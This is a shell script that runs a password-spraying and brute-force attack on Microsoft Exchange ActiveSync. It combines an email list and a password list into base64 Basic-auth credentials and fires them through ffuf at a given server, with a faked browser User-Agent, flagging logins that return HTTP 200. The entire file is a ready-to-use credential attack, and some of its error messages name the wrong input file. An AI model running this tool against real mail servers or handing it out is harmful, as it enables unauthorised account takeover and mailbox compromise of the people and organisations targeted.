#!/bin/sh

if [ "$#" -ne 3 ]; then
    printf "Usage: %s MailServerURL emails.txt passwords.txt\n" "$0" >&2
    exit 1
fi

if ! [ -f "$2" ]; then
    printf "%s file not found.\n\n" "$1" >&2
    printf "Usage: %s MailServerURL emails.txt passwords.txt\n" "$0" >&2
    exit 1
fi

if ! [ -f "$3" ]; then
    printf "%s file not found.\n\n" "$2" >&2
    printf "Usage: %s MailServerURL emails.txt passwords.txt\n" "$0" >&2
    exit 1
fi

Emails="$2"
Passwords="$3"
Emails_Size=$(wc -l "$Emails" |awk '{print $1;}')
Password_Size=$(wc -l "$Passwords" |awk '{print $1;}')
Wordlist_Size=$((Emails_Size * Password_Size))
Wordlist_File="/tmp/wordlist_"$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c10)".txt"

printf "Emails: %s\n" "$Emails_Size" >&2
printf "Passwords: %s\n" "$Password_Size" >&2
printf "Total combinations: %s\n\n" "$Wordlist_Size" >&2
printf "Wordlist file: %s\n" "$Wordlist_File" >&2
printf "Generating wordlist...\n\n"


while IFS= read -r password
do
    while IFS= read -r email
    do
        printf "%s:%s" "$email" "$password" | base64 >> "$Wordlist_File"
    done < "$Emails"
done < "$Passwords"


ffuf -c -u "$1"/Microsoft-Server-ActiveSync -w "$Wordlist_File" -H "Authorization: Basic FUZZ" -H "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" -X OPTIONS -mc 200

rm "$Wordlist_File"